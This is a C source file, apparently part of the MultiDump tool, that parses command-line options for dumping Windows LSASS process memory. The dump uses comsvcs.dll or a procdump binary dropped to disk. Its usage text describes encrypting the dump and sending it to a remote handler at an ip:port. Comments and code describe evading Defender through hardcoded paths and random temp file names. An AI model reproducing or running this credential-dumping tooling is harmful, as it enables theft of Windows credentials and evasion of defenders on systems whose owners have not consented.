#include <Windows.h>
#include <stdio.h>

#include "Common.h"
#include "Debug.h"

ParsedArgs ParseArgs(int argc, char* argv[]) {
	ParsedArgs args = { 0 };
	CHAR currentDir[MAX_PATH];
	CHAR procDumpPath[MAX_PATH];
	CHAR dmpDir[MAX_PATH];
	CHAR tempDir[MAX_PATH];
	CHAR tempDumpPath[MAX_PATH];

	for (int i = 0; i < argc; i++) {
		if ((strcmp(argv[i], "-H") == 0 || strcmp(argv[i], "-h") == 0)) {
#ifdef DEBUG
			printf("\nUsage:\tMultiDump.exe [-p <ProcDumpPath>] [-l <LocalDumpPath> | -r <RemoteHandlerAddr>] [--procdump] [-v]\n\n");
			printf("Default:\tLocal mode, dumps LSASS using comsvcs.dll\n");
			printf("-p\t\tPath to save procdump.exe, use full path. Default to current directory\n");
			printf("-l\t\tPath to save encrypted dump file, use full path. Default to current directory\n");
			printf("-r\t\tSet ip:port to connect to a remote handler\n");
			printf("--procdump\tWrites procdump to disk and use it to dump LSASS\n");
#endif // DEBUG
			exit(0);
		}
		else if ((strcmp(argv[i], "-P") == 0 || strcmp(argv[i], "-p") == 0) && i + 1 < argc) {
			args.procDumpPath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-l") == 0 || strcmp(argv[i], "-L") == 0) && i + 1 < argc) {
			args.localDmpPath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "-R") == 0) && i + 1 < argc) {
			args.remotePath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "-V") == 0)) {
			args.verboseMode = TRUE;
		}
		else if ((strcmp(argv[i], "--procdump") == 0)) {
			args.procDumpMode = TRUE;
		}
	}

	if (_getcwd(currentDir, MAX_PATH) == NULL) {
#ifdef DEBUG
		printf("[!] Error getting current directory\n");
#endif // DEBUG
		exit(-1);
	}

	if (!GetTempPathA(MAX_PATH, tempDir)) {
#ifdef DEBUG
		printf("[!] GetTempPathA Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		exit(-1);
	}

	// If ProcDump -o uses a relative path, it gets caught by defende somehow
	// Hardcoding this to make sure it works
	char dmpName[7];
	GenerateFileName(dmpName, 6);
	snprintf(tempDumpPath, sizeof(tempDumpPath), "%s%s.dmp", tempDir, dmpName);
	args.tempDmpPath = strdup(tempDumpPath);

	if (args.procDumpPath == NULL) {
		char procDumpName[7];
		GenerateFileName(procDumpName, 6);
		snprintf(procDumpPath, sizeof(procDumpPath), "%s%s.exe", tempDir, procDumpName);
		args.procDumpPath = strdup(procDumpPath);
	}

	args.localMode = (args.remotePath == NULL);

	// Setting the default in case remote mode fails
	if (args.localDmpPath == NULL) {
		char encDmpName[7];
		GenerateFileName(encDmpName, 6);
		snprintf(dmpDir, sizeof(dmpDir), "%s\\%s.dat", currentDir, encDmpName);
		args.localDmpPath = strdup(dmpDir);
	}
	return args;
}